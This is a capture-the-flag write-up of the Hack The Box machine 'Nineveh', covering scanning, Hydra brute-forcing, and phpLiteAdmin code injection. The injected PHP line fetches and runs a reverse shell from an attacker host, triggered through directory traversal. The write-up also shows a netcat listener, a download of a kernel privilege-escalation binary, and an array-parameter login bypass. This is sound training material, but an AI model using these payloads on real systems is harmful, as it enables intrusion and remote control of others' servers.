# Hackthebox Nineveh

## Enumeration

Start with an nmap scan
```
$ sudo nmap -A -T4 -p- 10.129.180.10
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-01 09:43 EST
Nmap scan report for 10.129.180.10
Host is up (0.033s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
```

The front page shows a default page for the server.

Scan the directories

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.180.10
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/01 09:40:49 Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 319] [--> http://10.129.180.10/department/]
/server-status        (Status: 403) [Size: 301]                                       
                                                                                      
===============================================================
2022/01/01 09:43:17 Finished
===============================================================
```

URL /department/login.php provides us a login page asking for a username and password.

Testing out few usernames it seems the error message reveals if an existing username was given by providering error message "Invalid Password!". Username 'admin' seems to exist.

Also, the source code of the page contains

```
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

We need to scan also the https separately

```
$ gobuster dir -u https://10.129.180.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,php -k               1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.180.10
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2022/01/01 12:15:04 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 313] [--> https://10.129.180.10/db/]
/server-status        (Status: 403) [Size: 302]                                
/secure_notes         (Status: 301) [Size: 323] [--> https://10.129.180.10/secure_notes/]
                                                                                         
===============================================================
2022/01/01 12:22:37 Finished
===============================================================
```

The db-directory provides us a phpLiteAdmin login page.


## Vulnerability Scanning

Nikto reports a long list of findings

```
$ nikto -h 10.129.180.10 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.180.10
+ Target Hostname:    10.129.180.10
+ Target Port:        80
+ Start Time:         2022-01-01 09:44:14 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
^[+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: b2, size: 5535e4e04002a, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ /./ - 200/OK Response could be Appending '/./' to a directory may reveal PHP source code.
+ /?mod=node&nid=some_thing&op=view - 200/OK Response could be Sage 1.0b3 may reveal system paths with invalid module names.
+ /?mod=some_thing&op=browse - 200/OK Response could be Sage 1.0b3 reveals system paths with invalid module names.
+ /./ - 200/OK Response could be Appending '/./' to a directory allows indexing
+ / - 200/OK Response could be Appears to be a default Apache Tomcat install.
+ // - 200/OK Response could be Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ /?OpenServer - 200/OK Response could be This install allows remote users to enumerate DB names, see http://www.securiteam.com/securitynews/6W0030U35W.html
+ // - 200/OK Response could be Proxy auto configuration file retrieved.
+ /%2e/ - 200/OK Response could be Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513
+ /%2e/ - 200/OK Response could be Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ /%2e/ - 200/OK Response could be Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ /?mod=<script>alert(document.cookie)</script>&op=browse - 200/OK Response could be Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /?sql_debug=1 - 200/OK Response could be The PHP-Nuke install may allow attackers to enable debug mode and disclose sensitive information by adding sql_debug=1 to the query string.
+ /// - 200/OK Response could be Acme.Serve allows arbitrary file retrieval
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 - 200/OK Response could be PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 - 200/OK Response could be PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 - 200/OK Response could be PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42 - 200/OK Response could be PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ /?PageServices - 200/OK Response could be The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ /?wp-cs-dump - 200/OK Response could be The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ / - 200/OK Response could be Default IBM TotalStorage server found.
+ / - 200/OK Response could be Default EMC Cellera manager server is running.
+ / - 200/OK Response could be Default EMC ControlCenter manager server is running.
+ / - 200/OK Response could be Default Novell NDS iMonitor was found. Default account may be 'sadmin' with no password.
+ / - 200/OK Response could be Default Sun Answerbook server running.
+ / - 200/OK Response could be Default JRun 2 server running.
+ / - 200/OK Response could be Cisco VoIP Phone default web server found.
+ / - 200/OK Response could be Default Sybase Jaguar CTS server running.
+ / - 200/OK Response could be Default JRun 3 server running.
+ / - 200/OK Response could be Default Lantronix printer found.
+ / - 200/OK Response could be Default IBM Tivoli Server Administration server is running.
+ / - 200/OK Response could be Default JRun 4 server running.
+ / - 200/OK Response could be Default Xerox WorkCentre server is running.
+ / - 200/OK Response could be Appears to be a default Domino 6 install.
+ / - 200/OK Response could be Default Lotus Domino server running.
+ / - 200/OK Response could be Appears to be a default Sambar install.
+ / - 200/OK Response could be Appears to be a default Apache install.
+ / - 200/OK Response could be Appears to be a default Apache install.
+ / - 200/OK Response could be Appears to be a default IIS install.
+ / - 200/OK Response could be Appears to be a default IIS 4.0 install.
+ / - 200/OK Response could be Appears to be a default IIS install.
+ / - 200/OK Response could be Appears to be a default Netscape/iPlanet 6 install.
+ / - 200/OK Response could be Samba-swat web server. Used to administer Samba.
+ / - 200/OK Response could be It is possible to retrieve the source of .asp files. Install Webhits patch at http://www.microsoft.com/technet/security/bulletin/https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-006.asp
+ /info.php: Output from the phpinfo() function was found.
+ /info.php - 200/OK Response could be PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /info.php - 200/OK Response could be PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// - 200/OK Response could be Abyss 1.03 reveals directory listing when 	 /'s are requested.
+ / - 200/OK Response could be By sending an OPTIONS request for /, the physical path to PHP can be revealed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0240, http://www.securityfocus.com/bid/8119, http://www.securityfocus.com/bid/4057, http://archives.neohapsis.com/archives/bugtraq/2002-02/0043.html.
+ /?pattern=/etc/*&sort=name - 200/OK Response could be The TCLHttpd 3.4.2 server allows directory listings via dirlist.tcl.
+ /?D=A - 200/OK Response could be Apache allows directory listings by requesting.
+ /?N=D - 200/OK Response could be Apache allows directory listings by requesting.
+ /?S=A - 200/OK Response could be Apache allows directory listings by requesting.
+ /?M=A - 200/OK Response could be Apache allows directory listings. Upgrade Apache or disable directory indexing.
+ /?\"><script>alert('Vulnerable');</script> - 200/OK Response could be IIS is vulnerable to Cross Site Scripting (XSS). See https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/MS02-018, http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0075, SNS-49, http://www.cert.org/advisories/CA-2002-09.html
+ /icons/README - 200/OK Response could be Apache default file found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt? - 200/OK Response could be RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls - 200/OK Response could be RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls - 200/OK Response could be RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /?show=http://cirt.net/rfiinc.txt?? - 200/OK Response could be RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ /info.php?file=http://cirt.net/rfiinc.txt? - 200/OK Response could be RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ / - 200/OK Response could be Appears to be a default IIS 7 install.
+ / - 200/OK Response could be A Wordpress installation was found.
+ /?-s - 200/OK Response could be PHP allows retrieval of the source code via the -s parameter, and may allow command execution. See http://www.kb.cert.org/vuls/id/520827
+ /?q[]=x - 200/OK Response could be Drupal 7 contains a path information disclosure
+ /?sc_mode=edit - 200/OK Response could be Sitecore CMS is installed. This url redirects to the login page.
+ /?xmlcontrol=body%20onload=alert(123) - 200/OK Response could be Sitecore CMS vulnerable to Cross-Site Scripting
+ /?admin - 200/OK Response could be RainLoop Webmail admin backend identified. Default credentials are admin:12345
+ / - 200/OK Response could be SAP Hybris Management Console found. Default credentials are admin:nimda
+ 7889 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2022-01-01 09:49:31 (GMT-5) (317 seconds)
---------------------------------------------------------------------------
```

From the info.php we get few interesting pieces of information

```
System 	Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 
Apache Version 	Apache/2.4.18 (Ubuntu) 
Client API library version 	mysqlnd 5.0.12-dev - 20150407 - $Id: b5c5906d452ec590732a93b051f3827e02749b83 $ 
```

Nikto for the https-site

```
$ nikto -h 10.129.180.10:443                                                                                                              1 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.180.10
+ Target Hostname:    10.129.180.10
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GR/ST=Athens/L=Athens/O=HackTheBox Ltd/OU=Support/CN=nineveh.htb/emailAddress=admin@nineveh.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=GR/ST=Athens/L=Athens/O=HackTheBox Ltd/OU=Support/CN=nineveh.htb/emailAddress=admin@nineveh.htb
+ Start Time:         2022-01-01 12:25:25 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Hostname '10.129.180.10' does not match certificate's names: nineveh.htb
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3092: /db/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2022-01-01 12:43:53 (GMT-5) (1108 seconds)
---------------------------------------------------------------------------
```

And for phpLiteAdmin we have some interesting vulnerabilities

```
$ searchsploit phpliteadmin                                  
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                                          | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                   | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                 | php/webapps/39714.txt
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Initial Access

### Bruteforce admin credentials

As we know the username to the login page, bruteforce the password. Better to use hydra as Burpsuite is painfully slow when using a community edition.

```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.180.10 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 10:17:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.129.180.10:80/department/login.php:username=^USER^&password=^PASS^:Invalid
[STATUS] 2834.00 tries/min, 2834 tries in 00:01h, 14341565 to do in 84:21h, 16 active
[80][http-post-form] host: 10.129.180.10   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 10:19:25
```

With the username and password we can login and are greeted with an under construction -page. However, we can see a notes page. The URL is /department/manage.php?notes=files/ninevehNotes.txt and the contents

```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

So, it seems we are tasked to find our secret folder and the contents of it.

On the https site the same

```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.180.10 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true&remember=false:Incorrect"   
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-01 12:41:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.129.180.10:443/db/index.php:password=^PASS^&login=Log+In&proc_login=true&remember=false:Incorrect
[443][http-post-form] host: 10.129.180.10   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 12:42:15
```

### phpLiteAdmin code injection

Login to the admin portal. Create a table called ninevehnotes.txt.php that gets created in directory /var/tmp/ninevehnotes.txt.php (remember to switch to the new table from the menu).

Create one table with a one field, type TEXT and the default value the payload. We use php reverse shell so use the kali standard, just fix the ip address.

```
$ cp /usr/share/laudanum/php/php-reverse-shell.php .                                            
                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Nineveh]
└─$ vi php-reverse-shell.php 
                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Nineveh]
└─$ python -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

Create a table with one field, and the default value of our field fetches our reverse shell and executes it

For this CTF it is mandatory the database table contains name ninevehNotes.txt. This seems to be something the manage.php script checks. We can get past that check by naming our database to ninevehNotes.txt.php. The name of the database table and field do not matter.

```
<?php system("wget 10.10.14.23:9000/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php"); ?>
```

Finally insert the default value we defined for the field to the table.


### Directory traversal

The url of the notes seems to be vulnerable for directory traversal. This can be proven as all the following urls show the contents of the notes

```
http://10.129.180.10/department/manage.php?notes=../department/files/ninevehNotes.txt
http://10.129.180.10/department/manage.php?notes=../../html/department/files/ninevehNotes.txt
http://10.129.180.10/department/manage.php?notes=../../../www/html/department/files/ninevehNotes.txt
```

From this we can deduct the full directory path is as follow, but instead of showing the notes we get an error message 'file name too long'. However, we should be able to use this to plan our next moves.

```
http://10.129.180.10/department/manage.php?notes=../../../../var/www/html/department/files/ninevehNotes.txt
```

Using this information we can call the php-exploit

```
http://10.129.180.10/department/manage.php?notes=/var/tmp/ninevehNotes.txt.php
```

and we get a shell.

```
 nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.180.10] 51816
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:39:49 up  4:07,  0 users,  load average: 0.13, 0.06, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Ctrl-z, stty raw -echo, fg, reset to get a fully functional shell.

## Privilege Escalation

### CVE-2017-6074


```
$ wget 10.10.14.23:5555/pwn
wget 10.10.14.23:5555/pwn
--2022-01-01 13:04:25--  http://10.10.14.23:5555/pwn
Connecting to 10.10.14.23:5555... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23176 (23K) [application/octet-stream]
Saving to: 'pwn'

pwn                 100%[===================>]  22.63K  --.-KB/s    in 0.03s   

2022-01-01 13:04:25 (712 KB/s) - 'pwn' saved [23176/23176]

$



Note to self: 

submitting the form from Firefox, Burp shows the POST data as:

username=admin&password=admin

If changed this to:

username=admin&password[]=

It let’s me in
